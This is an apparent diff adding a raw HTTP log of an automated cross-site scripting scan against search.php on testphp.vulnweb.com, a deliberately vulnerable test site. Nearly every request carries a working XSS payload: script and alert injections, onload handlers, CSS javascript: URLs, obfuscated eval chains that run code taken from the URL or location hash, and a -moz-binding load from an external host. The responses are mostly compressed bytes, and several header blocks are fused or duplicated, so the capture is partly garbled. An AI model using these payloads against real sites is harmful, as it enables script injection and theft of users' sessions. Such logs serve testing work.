@@ -1,0 +1,1371 @@
+GET /search.php?test=query$=document,$=$.URL,$$=unescape,$$$=eval,$$$($$($))%0
+
+HTTP/1.1
+Host: testphp.vulnweb.com
+User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/34.0.1847.131 Safari/537.36
+Accept-Encoding: gzip, deflate
+Accept: */*
+Connection: keep-alive
+...Hb.
+
+HTTP/1.1 200 OK
+Server: nginx/1.19.0
+Date: Sun, 29 Oct 2023 17:40:41 GMT
+Content-Type: text/html; charset=UTF-8
+Transfer-Encoding: chunked
+Connection: keep-alive
+X-Powered-By: PHP/5.6.40-38+ubuntu20.04.1+deb.sury.org+1
+Content-Encoding: gzip
+hD....
+
+GET /search.php?test=query$=document,$=$.URL,$$=unescape,$$$=eval,$$$($$($))%0
+
+HTTP/1.1
+Host: testphp.vulnweb.com
+User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64; rv:18.0) Gecko/20100101 Firefox/18.0
+Accept-Encoding: gzip, deflate
+Accept: */*
+Connection: keep-alive
+...dhD
+
+HTTP/1.1 200 OK
+Server: nginx/1.19.0
+Date: Sun, 29 Oct 2023 17:40:41 GMT
+Content-Type: text/html; charset=UTF-8
+Transfer-Encoding: chunked
+Connection: keep-alive
+X-Powered-By: PHP/5.6.40-38+ubuntu20.04.1+deb.sury.org+1
+Content-Encoding: gzip
+..+...
+
+GET /search.php?test=queryevil=/ev/.source+/al/.source,changeProto=/Strin/.source+/g.prototyp/.source+/e.ss=/.source+/Strin/.source+/g.prototyp/.source+/e.substrin/.source+/g/.source,hshCod=/documen/.source+/t.locatio/.source+/n.has/.source+/h/.source;7%5Bevil%5D(changeProto);hsh=7%5Bevil%5D(hshCod),cod=hsh.ss(1);7%5Bevil%5D(cod)%0
+
+HTTP/1.1
+Host: testphp.vulnweb.com
+User-Agent: Mozilla/5.0 (iPhone; CPU iPhone OS 9_1 like Mac OS X) AppleWebKit/601.1.46 (KHTML, like Gecko) Version/9.0 Mobile/13B143 Safari/601.1
+Accept-Encoding: gzip, deflate
+Accept: */*
+Connection: keep-alive
+......
+
+HTTP/1.1 200 OK
+Server: nginx/1.19.0
+Date: Sun, 29 Oct 2023 17:40:42 GMT
+Content-Type: text/html; charset=UTF-8
+Transfer-Encoding: chunked
+Connection: keep-alive
+X-Powered-By: PHP/5.6.40-38+ubuntu20.04.1+deb.sury.org+1
+Content-Encoding: gzip
+G8....
+
+GET /search.php?test=querywith(location)with(hash)eval(substring(1))%0
+
+HTTP/1.1
+Host: testphp.vulnweb.com
+User-Agent: Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1; InfoPath.2)
+Accept-Encoding: gzip, deflate
+Accept: */*
+Connection: keep-alive
+....G8
+
+HTTP/1.1 200 OK
+Server: nginx/1.19.0
+Date: Sun, 29 Oct 2023 17:40:42 GMT
+Content-Type: text/html; charset=UTF-8
+Transfer-Encoding: chunked
+Connection: keep-alive
+X-Powered-By: PHP/5.6.40-38+ubuntu20.04.1+deb.sury.org+1
+Content-Encoding: gzip
+^W....
+
+GET /search.php?test=query%3CSTYLE%20TYPE=%22text/javascript%22%3Ealert('XSS');%3C/STYLE%3E%0
+
+HTTP/1.1
+Host: testphp.vulnweb.com
+User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64; rv:49.0) Gecko/20100101 Firefox/49.0
+Accept-Encoding: gzip, deflate
+Accept: */*
+Connection: keep-alive
+...Y^W
+
+HTTP/1.1 200 OK
+Server: nginx/1.19.0
+Date: Sun, 29 Oct 2023 17:40:43 GMT
+Content-Type: text/html; charset=UTF-8
+Transfer-Encoding: chunked
+Connection: keep-alive
+X-Powered-By: PHP/5.6.40-38+ubuntu20.04.1+deb.sury.org+1
+Content-Encoding: gzip
+2Z.^..
+
+GET /search.php?test=query%3CSTYLE%20type=%22text/css%22%3EBODY%7Bbackground:url(%22javascript:alert('XSS')%22)%7D%3C/STYLE%3E%0
+
+HTTP/1.1
+Host: testphp.vulnweb.com
+User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:49.0) Gecko/20100101 Firefox/49.0
+Accept-Encoding: gzip, deflate
+Accept: */*
+Connection: keep-alive
+....2Z
+
+HTTP/1.1 200 OK
+Server: nginx/1.19.0
+Date: Sun, 29 Oct 2023 17:40:44 GMT
+Content-Type: text/html; charset=UTF-8
+Transfer-Encoding: chunked
+Connection: keep-alive
+X-Powered-By: PHP/5.6.40-38+ubuntu20.04.1+deb.sury.org+1
+Content-Encoding: gzip
+......
+
+GET /search.php?test=query%3CSTYLE%3E.XSS%7Bbackground-image:url(%22javascript:alert('XSS')%22);%7D%3C/STYLE%3E%3CA%20CLASS=XSS%3E%3C/A%3E%0
+
+HTTP/1.1
+Host: testphp.vulnweb.com
+User-Agent: Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.181 Safari/537.36
+Accept-Encoding: gzip, deflate
+Accept: */*
+Connection: keep-alive
+...B..
+
+HTTP/1.1 200 OK
+Server: nginx/1.19.0
+Date: Sun, 29 Oct 2023 17:40:45 GMT
+Content-Type: text/html; charset=UTF-8
+Transfer-Encoding: chunked
+Connection: keep-alive
+X-Powered-By: PHP/5.6.40-38+ubuntu20.04.1+deb.sury.org+1
+Content-Encoding: gzip
+...H..
+
+GET /search.php?test=query%3CSTYLE%3E@im%5Cport'%5Cja%5Cvasc%5Cript:alert(%22XSS%22)';%3C/STYLE%3E%0
+
+HTTP/1.1
+Host: testphp.vulnweb.com
+User-Agent: Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/46.0.2486.0 Safari/537.36 Edge/13.10586
+Accept-Encoding: gzip, deflate
+Accept: */*
+Connection: keep-alive
+Server: nginx/1.19.0
+Date: Sun, 29 Oct 2023 17:40:45 GMT
+Content-Type: text/html; charset=UTF-8
+Transfer-Encoding: chunked
+Connection: keep-alive
+X-Powered-By: PHP/5.6.40-38+ubuntu20.04.1+deb.sury.org+1
+Content-Encoding: gzip
+.8.x..
+
+GET /search.php?test=query%3CLINK%20REL=%22stylesheet%22%20HREF=%22javascript:alert('XSS');%22%3E%0
+
+HTTP/1.1
+Host: testphp.vulnweb.com
+User-Agent: Mozilla/5.0 (iPhone; CPU iPhone OS 10_0_2 like Mac OS X) AppleWebKit/602.1.50 (KHTML, like Gecko) Version/10.0 Mobile/14A456 Safari/602.1
+Accept-Encoding: gzip, deflate
+Accept: */*
+Connection: keep-alive
+Server: nginx/1.19.0
+Date: Sun, 29 Oct 2023 17:40:46 GMT
+Content-Type: text/html; charset=UTF-8
+Transfer-Encoding: chunked
+Connection: keep-alive
+X-Powered-By: PHP/5.6.40-38+ubuntu20.04.1+deb.sury.org+1
+Content-Encoding: gzip
+]6.~..
+
+GET /search.php?test=query%3CTABLE%20BACKGROUND=%22javascript:alert('XSS')%22%3E%3C/TABLE%3E%0
+
+HTTP/1.1
+Host: testphp.vulnweb.com
+User-Agent: Mozilla/5.0 (Windows NT 6.2; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/42.0.2311.90 Safari/537.36
+Accept-Encoding: gzip, deflate
+Accept: */*
+Connection: keep-alive
+Server: nginx/1.19.0
+Date: Sun, 29 Oct 2023 17:40:46 GMT
+Content-Type: text/html; charset=UTF-8
+Transfer-Encoding: chunked
+Connection: keep-alive
+X-Powered-By: PHP/5.6.40-38+ubuntu20.04.1+deb.sury.org+1
+Content-Encoding: gzip
+;.A...
+
+GET /search.php?test=queryA=alert;A(1)%0
+
+HTTP/1.1
+Host: testphp.vulnweb.com
+User-Agent: Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/52.0.2743.116 Safari/537.36 Edge/15.15063
+Accept-Encoding: gzip, deflate
+Accept: */*
+Connection: keep-alive
+...z;.
+
+HTTP/1.1 200 OK
+Server: nginx/1.19.0
+Date: Sun, 29 Oct 2023 17:40:47 GMT
+Content-Type: text/html; charset=UTF-8
+Transfer-Encoding: chunked
+Connection: keep-alive
+X-Powered-By: PHP/5.6.40-38+ubuntu20.04.1+deb.sury.org+1
+Content-Encoding: gzip
+.-.f..
+
+GET /search.php?test=query%3CTABLE%3E%3CTD%20BACKGROUND=%22javascript:alert('XSS')%22%3E%3C/TD%3E%3C/TABLE%3E%0
+
+HTTP/1.1
+Host: testphp.vulnweb.com
+User-Agent: Mozilla/5.0 (Windows NT 6.3; WOW64; rv:41.0) Gecko/20100101 Firefox/41.0
+Accept-Encoding: gzip, deflate
+Accept: */*
+Connection: keep-alive
+Server: nginx/1.19.0
+Date: Sun, 29 Oct 2023 17:40:48 GMT
+Content-Type: text/html; charset=UTF-8
+Transfer-Encoding: chunked
+Connection: keep-alive
+X-Powered-By: PHP/5.6.40-38+ubuntu20.04.1+deb.sury.org+1
+Content-Encoding: gzip
+	..7..
+
+GET /search.php?test=query%3C/textarea%3E%3Cbr%3E%3Ccode%20onmouseover=a=eval;b=alert;a(b(/g/.source));%3EMOVE%20MOUSE%20OVER%20THIS%20AREA%3C/code%3E%0
+
+HTTP/1.1
+Host: testphp.vulnweb.com
+User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/61.0.3163.100 Safari/537.36
+Accept-Encoding: gzip, deflate
+Accept: */*
+Connection: keep-alive
+Server: nginx/1.19.0
+Date: Sun, 29 Oct 2023 17:40:48 GMT
+Content-Type: text/html; charset=UTF-8
+Transfer-Encoding: chunked
+Connection: keep-alive
+X-Powered-By: PHP/5.6.40-38+ubuntu20.04.1+deb.sury.org+1
+Content-Encoding: gzip
+N.-...
+
+GET /search.php?test=query'%25uff1cscript%25uff1ealert('XSS')%25uff1c/script%25uff1e'%0
+
+HTTP/1.1
+Host: testphp.vulnweb.com
+User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64; rv:31.0) Gecko/20100101 Firefox/31.0
+Accept-Encoding: gzip, deflate
+Accept: */*
+Connection: keep-alive
+....N.
+
+HTTP/1.1 200 OK
+Server: nginx/1.19.0
+Date: Sun, 29 Oct 2023 17:40:49 GMT
+Content-Type: text/html; charset=UTF-8
+Transfer-Encoding: chunked
+Connection: keep-alive
+X-Powered-By: PHP/5.6.40-38+ubuntu20.04.1+deb.sury.org+1
+Content-Encoding: gzip
+2M.d..
+
+GET /search.php?test=queryhttp://aa'%3E%3Cscript%3Ealert(123)%3C/script%3E%0
+
+HTTP/1.1
+Host: testphp.vulnweb.com
+User-Agent: Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.3538.67 Safari/537.36
+Accept-Encoding: gzip, deflate
+Accept: */*
+Connection: keep-alive
+Server: nginx/1.19.0
+Date: Sun, 29 Oct 2023 17:40:49 GMT
+Content-Type: text/html; charset=UTF-8
+Transfer-Encoding: chunked
+Connection: keep-alive
+X-Powered-By: PHP/5.6.40-38+ubuntu20.04.1+deb.sury.org+1
+Content-Encoding: gzip
+.f....
+
+GET /search.php?test=queryhttp://aa%22%3E%3Cscript%3Ealert(123)%3C/script%3E%0
+
+HTTP/1.1
+Host: testphp.vulnweb.com
+User-Agent: Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1; InfoPath.2)
+Accept-Encoding: gzip, deflate
+Accept: */*
+Connection: keep-alive
+.....f
+
+HTTP/1.1 200 OK
+Server: nginx/1.19.0
+Date: Sun, 29 Oct 2023 17:40:50 GMT
+Content-Type: text/html; charset=UTF-8
+Transfer-Encoding: chunked
+Connection: keep-alive
+X-Powered-By: PHP/5.6.40-38+ubuntu20.04.1+deb.sury.org+1
+Content-Encoding: gzip
+.H-...
+
+GET /search.php?test=query%3E%22%27%3E%3Cimg%20src%3D%22javascript:alert(%27%20XSS%27)%22%3E%0
+
+HTTP/1.1
+Host: testphp.vulnweb.com
+User-Agent: Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.7.10) Gecko/20050716 Firefox/1.0.6
+Accept-Encoding: gzip, deflate
+Accept: */*
+Connection: keep-alive
+.....H
+
+HTTP/1.1 200 OK
+Server: nginx/1.19.0
+Date: Sun, 29 Oct 2023 17:40:50 GMT
+Content-Type: text/html; charset=UTF-8
+Transfer-Encoding: chunked
+Connection: keep-alive
+X-Powered-By: PHP/5.6.40-38+ubuntu20.04.1+deb.sury.org+1
+Content-Encoding: gzip
+.>O^..
+
+GET /search.php?test=query%BCscript%BEalert(%A2XSS%A2)%BC/script%BE%0
+
+HTTP/1.1
+Host: testphp.vulnweb.com
+User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_4) AppleWebKit/605.1.15 (KHTML, like Gecko)
+Accept-Encoding: gzip, deflate
+Accept: */*
+Connection: keep-alive
+Server: nginx/1.19.0
+Date: Sun, 29 Oct 2023 17:40:51 GMT
+Content-Type: text/html; charset=UTF-8
+Transfer-Encoding: chunked
+Connection: keep-alive
+X-Powered-By: PHP/5.6.40-38+ubuntu20.04.1+deb.sury.org+1
+Content-Encoding: gzip
+Host: testphp.vulnweb.com
+User-Agent: Mozilla/5.0 (iPad; CPU OS 12_1_4 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/16D57
+Accept-Encoding: gzip, deflate
+Accept: */*
+Connection: keep-alive
+....Ey
+
+HTTP/1.1 200 OK
+Server: nginx/1.19.0
+Date: Sun, 29 Oct 2023 17:40:52 GMT
+Content-Type: text/html; charset=UTF-8
+Transfer-Encoding: chunked
+Connection: keep-alive
+X-Powered-By: PHP/5.6.40-38+ubuntu20.04.1+deb.sury.org+1
+Content-Encoding: gzip
+...s..
+
+GET /search.php?test=querywith(document.__parent__)alert(1)%0
+
+HTTP/1.1
+Host: testphp.vulnweb.com
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/64.0.3282.186 Safari/537.36
+Accept-Encoding: gzip, deflate
+Accept: */*
+Connection: keep-alive
+Server: nginx/1.19.0
+Date: Sun, 29 Oct 2023 17:40:52 GMT
+Content-Type: text/html; charset=UTF-8
+Transfer-Encoding: chunked
+Connection: keep-alive
+X-Powered-By: PHP/5.6.40-38+ubuntu20.04.1+deb.sury.org+1
+Content-Encoding: gzip
+.1._..
+
+GET /search.php?test=query%3CHTML%3E%3CBODY%3E%3C?xml:namespace%20prefix=%22t%22%20ns=%22urn:schemas-microsoft-com:time%22%3E%3C?import%20namespace=%22t%22%20implementation=%2
+
+HTTP/1.1
+Host: testphp.vulnweb.com
+User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/13.0.4 Safari/605.1.15
+Accept-Encoding: gzip, deflate
+Accept: */*
+Connection: keep-alive
+Server: nginx/1.19.0
+Date: Sun, 29 Oct 2023 17:40:53 GMT
+Content-Type: text/html; charset=UTF-8
+Transfer-Encoding: chunked
+Connection: keep-alive
+X-Powered-By: PHP/5.6.40-38+ubuntu20.04.1+deb.sury.org+1
+Content-Encoding: gzip
+{.....
+
+GET /search.php?test=queryy=%3Ca%3Ealert%3C/a%3E;content%5By%5D(123)%0
+
+HTTP/1.1
+Host: testphp.vulnweb.com
+User-Agent: Mozilla/5.0 (iPhone; CPU iPhone OS 10_3_1 like Mac OS X) AppleWebKit/603.1.30 (KHTML, like Gecko) Version/10.0 Mobile/14E304 Safari/602.1
+Accept-Encoding: gzip, deflate
+Accept: */*
+Connection: keep-alive
+....{.
+
+HTTP/1.1 200 OK
+Server: nginx/1.19.0
+Date: Sun, 29 Oct 2023 17:40:54 GMT
+Content-Type: text/html; charset=UTF-8
+Transfer-Encoding: chunked
+Connection: keep-alive
+X-Powered-By: PHP/5.6.40-38+ubuntu20.04.1+deb.sury.org+1
+Content-Encoding: gzip
+.!.N..
+
+GET /search.php?test=query'';!--%22%3CXSS%3E=&%7B()%7D%0
+
+HTTP/1.1
+Host: testphp.vulnweb.com
+User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64; rv:38.0) Gecko/20100101 Firefox/38.0
+Accept-Encoding: gzip, deflate
+Accept: */*
+Connection: keep-alive
+Server: nginx/1.19.0
+Date: Sun, 29 Oct 2023 17:40:54 GMT
+Content-Type: text/html; charset=UTF-8
+Transfer-Encoding: chunked
+Connection: keep-alive
+X-Powered-By: PHP/5.6.40-38+ubuntu20.04.1+deb.sury.org+1
+Content-Encoding: gzip
+...4..
+
+GET /search.php?test=queryExecute(MsgBox(chr(88)&chr(83)&chr(83)))%3C%0
+
+HTTP/1.1
+Host: testphp.vulnweb.com
+User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; rv:51.0) Gecko/20100101 Firefox/51.0
+Accept-Encoding: gzip, deflate
+Accept: */*
+Connection: keep-alive
+Server: nginx/1.19.0
+Date: Sun, 29 Oct 2023 17:40:55 GMT
+Content-Type: text/html; charset=UTF-8
+Transfer-Encoding: chunked
+Connection: keep-alive
+X-Powered-By: PHP/5.6.40-38+ubuntu20.04.1+deb.sury.org+1
+Content-Encoding: gzip
+Host: testphp.vulnweb.com
+User-Agent: Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US) AppleWebKit/533.4 (KHTML, like Gecko) Chrome/5.0.375.99 Safari/533.4
+Accept-Encoding: gzip, deflate
+Accept: */*
+Connection: keep-alive
+...N..
+
+HTTP/1.1 200 OK
+Server: nginx/1.19.0
+Date: Sun, 29 Oct 2023 17:40:55 GMT
+Content-Type: text/html; charset=UTF-8
+Transfer-Encoding: chunked
+Connection: keep-alive
+X-Powered-By: PHP/5.6.40-38+ubuntu20.04.1+deb.sury.org+1
+Content-Encoding: gzip
+......
+
+GET /search.php?test=query%3CBODY%20BACKGROUND=%22javascript:alert('XSS');%22%3E%0
+
+HTTP/1.1
+Host: testphp.vulnweb.com
+User-Agent: Mozilla/5.0 (Windows NT 6.3; WOW64; rv:51.0) Gecko/20100101 Firefox/51.0
+Accept-Encoding: gzip, deflate
+Accept: */*
+Connection: keep-alive
+..f...
+
+HTTP/1.1 200 OK
+Server: nginx/1.19.0
+Date: Sun, 29 Oct 2023 17:41:15 GMT
+Content-Type: text/html; charset=UTF-8
+Transfer-Encoding: chunked
+Connection: keep-alive
+X-Powered-By: PHP/5.6.40-38+ubuntu20.04.1+deb.sury.org+1
+Content-Encoding: gzip
+.,j...
+
+GET /search.php?test=query%3CBODY%20ONLOAD=alert('XSS')%3E%0
+
+HTTP/1.1
+Host: testphp.vulnweb.com
+User-Agent: Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1; InfoPath.2)
+Accept-Encoding: gzip, deflate
+Accept: */*
+Connection: keep-alive
+..iA.,
+
+HTTP/1.1 200 OK
+Server: nginx/1.19.0
+Date: Sun, 29 Oct 2023 17:41:15 GMT
+Content-Type: text/html; charset=UTF-8
+Transfer-Encoding: chunked
+Connection: keep-alive
+X-Powered-By: PHP/5.6.40-38+ubuntu20.04.1+deb.sury.org+1
+Content-Encoding: gzip
+......
+
+GET /search.php?test=query%3Cbody%20onload=;a2=%7By:eval%7D;a1=%7Bx:a2.y('al'+'ert')%7D;;;;;;;;;_=a1.x;_(1);;;;%0
+
+HTTP/1.1
+Host: testphp.vulnweb.com
+User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/36.0.1985.125 Safari/537.36
+Accept-Encoding: gzip, deflate
+Accept: */*
+Connection: keep-alive
+..k...
+
+HTTP/1.1 200 OK
+Server: nginx/1.19.0
+Date: Sun, 29 Oct 2023 17:41:16 GMT
+Content-Type: text/html; charset=UTF-8
+Transfer-Encoding: chunked
+Connection: keep-alive
+X-Powered-By: PHP/5.6.40-38+ubuntu20.04.1+deb.sury.org+1
+Content-Encoding: gzip
+e.....
+
+GET /search.php?test=query%3Cbody%20onload=a1=%7Bx:this.parent.document%7D;a1.x.writeln(1);%3E%0
+
+HTTP/1.1
+Host: testphp.vulnweb.com
+User-Agent: Mozilla/5.0 (iPhone; CPU iPhone OS 10_3_1 like Mac OS X) AppleWebKit/603.1.30 (KHTML, like Gecko) Version/10.0 Mobile/14E304 Safari/602.1
+Accept-Encoding: gzip, deflate
+Accept: */*
+Connection: keep-alive
+..n.e.
+
+HTTP/1.1 200 OK
+Server: nginx/1.19.0
+Date: Sun, 29 Oct 2023 17:41:17 GMT
+Content-Type: text/html; charset=UTF-8
+Transfer-Encoding: chunked
+Connection: keep-alive
+X-Powered-By: PHP/5.6.40-38+ubuntu20.04.1+deb.sury.org+1
+Content-Encoding: gzip
+T.....
+
+GET /search.php?test=query%3Cbody%20onload=;a1=%7Bx:document%7D;;;;;;;;;_=a1.x;_.write(1);;;;%0
+
+HTTP/1.1
+Host: testphp.vulnweb.com
+User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_5) AppleWebKit/603.2.4 (KHTML, like Gecko) Version/10.1.1 Safari/603.2.4
+Accept-Encoding: gzip, deflate
+Accept: */*
+Connection: keep-alive
+..pzT.
+
+HTTP/1.1 200 OK
+Server: nginx/1.19.0
+Date: Sun, 29 Oct 2023 17:41:17 GMT
+Content-Type: text/html; charset=UTF-8
+Transfer-Encoding: chunked
+Connection: keep-alive
+X-Powered-By: PHP/5.6.40-38+ubuntu20.04.1+deb.sury.org+1
+Content-Encoding: gzip
+&0.G..
+
+GET /search.php?test=query%3CBODY%20onload
+
+HTTP/1.1
+Host: testphp.vulnweb.com
+User-Agent: Mozilla/5.0 (iPhone; CPU iPhone OS 10_3_3 like Mac OS X) AppleWebKit/603.3.8 (KHTML, like Gecko) Version/10.0 Mobile/14G60 Safari/602.1
+Accept-Encoding: gzip, deflate
+Accept: */*
+Connection: keep-alive
+Server: nginx/1.19.0
+Date: Sun, 29 Oct 2023 17:41:18 GMT
+Content-Type: text/html; charset=UTF-8
+Transfer-Encoding: chunked
+Connection: keep-alive
+X-Powered-By: PHP/5.6.40-38+ubuntu20.04.1+deb.sury.org+1
+Content-Encoding: gzip
+C.....
+
+GET /search.php?test=query%3Cbody%20onload=;;;;;;;;;;;_=alert;_(1);;;;%0
+
+HTTP/1.1
+Host: testphp.vulnweb.com
+User-Agent: Mozilla/5.0 (iPhone; CPU iPhone OS 12_1_2 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/16C101
+Accept-Encoding: gzip, deflate
+Accept: */*
+Connection: keep-alive
+..t.C.
+
+HTTP/1.1 200 OK
+Server: nginx/1.19.0
+Date: Sun, 29 Oct 2023 17:41:18 GMT
+Content-Type: text/html; charset=UTF-8
+Transfer-Encoding: chunked
+Connection: keep-alive
+X-Powered-By: PHP/5.6.40-38+ubuntu20.04.1+deb.sury.org+1
+Content-Encoding: gzip
+Q.U3..
+
+GET /search.php?test=query%3Cbody%20%3Cbody%20onload=;;;;;al:eval('al'+'ert(1)');;%3E%0
+
+HTTP/1.1
+Host: testphp.vulnweb.com
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36
+Accept-Encoding: gzip, deflate
+Accept: */*
+Connection: keep-alive
+Server: nginx/1.19.0
+Date: Sun, 29 Oct 2023 17:41:19 GMT
+Content-Type: text/html; charset=UTF-8
+Transfer-Encoding: chunked
+Connection: keep-alive
+X-Powered-By: PHP/5.6.40-38+ubuntu20.04.1+deb.sury.org+1
+Content-Encoding: gzip
+......
+
+GET /search.php?test=query%3Cbody/s/onload=x=%7Bdoc:parent.document%7D;x.doc.writeln(1)%0
+
+HTTP/1.1
+Host: testphp.vulnweb.com
+User-Agent: Mozilla/5.0 (iPhone; CPU iPhone OS 12_2 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E148
+Accept-Encoding: gzip, deflate
+Accept: */*
+Connection: keep-alive
+..y...
+
+HTTP/1.1 200 OK
+Server: nginx/1.19.0
+Date: Sun, 29 Oct 2023 17:41:20 GMT
+Content-Type: text/html; charset=UTF-8
+Transfer-Encoding: chunked
+Connection: keep-alive
+X-Powered-By: PHP/5.6.40-38+ubuntu20.04.1+deb.sury.org+1
+Content-Encoding: gzip
+..:...
+
+GET /search.php?test=query%3Cbody/%C3%A2%E2%82%AC%C2%9D%C3%A2%E2%82%AC%C2%9D$/onload=x=%7Bdoc:parent%5B%C3%A2%E2%82%AC%E2%84%A2document%C3%A2%E2%82%AC%E2%84%A2%5D%7D;x.doc.writeln(1)%0
+
+HTTP/1.1
+Host: testphp.vulnweb.com
+User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; rv:43.0) Gecko/20100101 Firefox/43.0
+Accept-Encoding: gzip, deflate
+Accept: */*
+Connection: keep-alive
+..|...
+
+HTTP/1.1 200 OK
+Server: nginx/1.19.0
+Date: Sun, 29 Oct 2023 17:41:20 GMT
+Content-Type: text/html; charset=UTF-8
+Transfer-Encoding: chunked
+Connection: keep-alive
+X-Powered-By: PHP/5.6.40-38+ubuntu20.04.1+deb.sury.org+1
+Content-Encoding: gzip
+.$....
+
+GET /search.php?test=query%3CSTYLE%3EBODY%7B-moz-binding:url(%22http://ha.ckers.org/xssmoz.xm
+
+HTTP/1.1
+Host: testphp.vulnweb.com
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:63.0) Gecko/20100101 Firefox/63.0
+Accept-Encoding: gzip, deflate
+Accept: */*
+Connection: keep-alive
+..~w.$
+
+HTTP/1.1 200 OK
+Server: nginx/1.19.0
+Date: Sun, 29 Oct 2023 17:41:21 GMT
+Content-Type: text/html; charset=UTF-8
+Transfer-Encoding: chunked
+Connection: keep-alive
+X-Powered-By: PHP/5.6.40-38+ubuntu20.04.1+deb.sury.org+1
+Content-Encoding: gzip
+.XAt..
+
+GET /search.php?test=query$_=document,$__=$_.URL,$___=unescape,$_=$_.body,$_.innerHTML%20=%20$___(http=$__)%0
+
+HTTP/1.1
+Host: testphp.vulnweb.com
+User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_3) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/12.0.3 Safari/605.1.15
+Accept-Encoding: gzip, deflate
+Accept: */*
+Connection: keep-alive
+Server: nginx/1.19.0
+Date: Sun, 29 Oct 2023 17:41:21 GMT
+Content-Type: text/html; charset=UTF-8
+Transfer-Encoding: chunked
+Connection: keep-alive
+X-Powered-By: PHP/5.6.40-38+ubuntu20.04.1+deb.sury.org+1
+Content-Encoding: gzip
+.q....
+
+GET /search.php?test=query%3Cstyle%3Ebody:after%7Bcontent:%20%C3%A2%E2%82%AC%C5%93%5C61%5C6c%5C65%5C72%5C74%5C28%5C31%5C29%C3%A2%E2%82%AC%C2%B3%7D%3C/style%3E%3Cscript%3Eeval(eval(document.styleSheets%5B0%5D.cssRules%5B0%5D.style.content))%3C/script%3E%0
+
+HTTP/1.1
+Host: testphp.vulnweb.com
+User-Agent: Mozilla/4.5 (compatible; HTTrack 3.0x; Windows 98)
+Accept-Encoding: gzip, deflate
+Accept: */*
+Connection: keep-alive
+...I.q
+
+HTTP/1.1 200 OK
+Server: nginx/1.19.0
+Date: Sun, 29 Oct 2023 17:41:22 GMT
+Content-Type: text/html; charset=UTF-8
+Transfer-Encoding: chunked
+Connection: keep-alive
+X-Powered-By: PHP/5.6.40-38+ubuntu20.04.1+deb.sury.org+1
+Content-Encoding: gzip
+..9...
+
+GET /search.php?test=query%3CSTYLE%20type=%22text/css%22%3EBODY%7Bbackground:url(%22javascript:alert('XSS')%22)%7D%3C/STYLE%3E%0
+
+HTTP/1.1
+Host: testphp.vulnweb.com
+User-Agent: Mozilla/5.0 (iPhone; CPU iPhone OS 13_2_3 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/13.0.3 Mobile/15E148 Safari/604.1
+Accept-Encoding: gzip, deflate
+Accept: */*
+Connection: keep-alive
+......
+
+HTTP/1.1 200 OK
+Server: nginx/1.19.0
+Date: Sun, 29 Oct 2023 17:41:23 GMT
+Content-Type: text/html; charset=UTF-8
+Transfer-Encoding: chunked
+Connection: keep-alive
+X-Powered-By: PHP/5.6.40-38+ubuntu20.04.1+deb.sury.org+1
+Content-Encoding: gzip
+..tM..
+
+GET /search.php?test=queryHTML%3E%3CBODY%3E%3C?xml:namespace%20prefix=%22t%22%20ns=%22urn:schemas-microsoft-com:time%22%3E%3C?import%20namespace=%22t%22%20implementation=%2
+
+HTTP/1.1
+Host: testphp.vulnweb.com
+User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.169 Safari/537.36
+Accept-Encoding: gzip, deflate
+Accept: */*
+Connection: keep-alive
+Server: nginx/1.19.0
+Date: Sun, 29 Oct 2023 17:41:23 GMT
+Content-Type: text/html; charset=UTF-8
+Transfer-Encoding: chunked
+Connection: keep-alive
+X-Powered-By: PHP/5.6.40-38+ubuntu20.04.1+deb.sury.org+1
+Content-Encoding: gzip
+...e..
+
+GET /search.php?test=query%3CBODY%20onload
+
+HTTP/1.1
+Host: testphp.vulnweb.com
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:72.0) Gecko/20100101 Firefox/72.0
+Accept-Encoding: gzip, deflate
+Accept: */*
+Connection: keep-alive
+Server: nginx/1.19.0
+Date: Sun, 29 Oct 2023 17:41:24 GMT
+Content-Type: text/html; charset=UTF-8
+Transfer-Encoding: chunked
+Connection: keep-alive
+X-Powered-By: PHP/5.6.40-38+ubuntu20.04.1+deb.sury.org+1
+Content-Encoding: gzip
